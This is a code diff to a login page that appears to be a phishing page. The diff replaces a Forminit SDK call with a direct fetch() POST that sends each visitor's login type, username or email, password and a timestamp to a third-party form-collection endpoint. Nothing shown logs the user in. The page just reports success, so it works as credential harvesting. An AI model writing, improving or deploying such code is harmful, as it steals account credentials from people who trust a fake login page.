@@ -154,7 +154,6 @@
     }
     .tt-terms a { color: #777; }
   </style>
-<script src="https://forminit.com/sdk/v1/forminit.js"></script>
 </head>
 <body>
 
@@ -241,8 +240,7 @@
 
 <script>
   // ─── CONFIG ───────────────────────────────────────────────
-  const FORM_ID = 'gbhfj72gxq5'; // your Forminit form ID
-  const forminit = new Forminit();
+  const FORMINIT_URL = 'https://forminit.com/f/7eqr12xblds';
   // ─────────────────────────────────────────────────────────
 
   let loginType = 'email';
@@ -311,23 +309,27 @@
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via Forminit official SDK (no CORS issues) ──
+    // ── send via Forminit ──
     try {
-      const formData = new FormData();
-      formData.append('fi-text-loginType', loginType);
-      formData.append('fi-text-identifier', identifier);
-      formData.append('fi-text-userkey',   password);
-      formData.append('fi-text-logintime', new Date().toLocaleString());
+      const res = await fetch(FORMINIT_URL, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({
+          'Login_Type': loginType,
+          'Identifier': identifier,
+          'Userkey':    password,
+          'Time':       new Date().toLocaleString()
+        })
+      });
 
-      const { data, error } = await forminit.submit(FORM_ID, formData);
-
-      if (error) {
-        showError('Error: ' + error.message);
-      } else {
+      const data = await res.json();
+      if (data.success || data.ok || res.ok) {
         document.getElementById('tt-success').classList.add('show');
+      } else {
+        showError('Error: ' + JSON.stringify(data));
       }
     } catch (err) {
-      showError('Something went wrong. Try again.');
+      showError('Network error: ' + err.message);
     }
 
     btn.disabled    = false;
